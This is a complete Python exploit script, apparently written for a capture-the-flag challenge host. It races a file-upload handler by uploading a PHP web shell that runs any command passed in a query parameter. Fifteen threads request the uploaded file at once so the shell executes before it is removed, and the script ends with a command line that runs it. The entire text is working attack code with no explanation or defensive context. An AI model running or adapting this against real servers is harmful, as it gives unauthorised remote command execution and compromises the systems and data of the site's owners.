import requests, threading, time, random, string, sys, urllib.parse
BASE="http://noctf.fa1lsnow.com:40074/"
def rand(n=8): return "".join(random.choices(string.ascii_lowercase+string.digits,k=n))
name=rand(10)+".php"
cmd=sys.argv[1] if len(sys.argv)>1 else "id"
payload=('<?php echo "PWNSTART"; system($_GET["c"]); echo "PWNEND"; ?>').encode()
filler="A"*2600
url=BASE+name+"?c="+urllib.parse.quote(cmd)
print("name",name,"url",url,flush=True)
stop=False
seen={}
results=[]
def getter():
    while not stop:
        try:
            r=requests.get(url,timeout=3)
            k=(r.status_code,"PWNSTART" in r.text,"PWNEND" in r.text)
            seen[k]=seen.get(k,0)+1
            if "PWNSTART" in r.text and len(r.text)>20:
                results.append(r.text)
        except Exception as e:
            k=("ERR",type(e).__name__)
            seen[k]=seen.get(k,0)+1
ts=[threading.Thread(target=getter,daemon=True) for _ in range(15)]
for t in ts: t.start()
time.sleep(0.03)
r=requests.post(BASE,data={"filler":filler},files={"file":(name,payload,"application/octet-stream")},timeout=15)
print("upload",r.status_code,r.text[-60:],flush=True)
time.sleep(0.7)
stop=True
for t in ts: t.join(timeout=2)
for k,v in seen.items(): print(v,k)
for x in results[:5]: print("RESULT:",repr(x))
EOF
python3 /tmp/race_cmd.py "id"

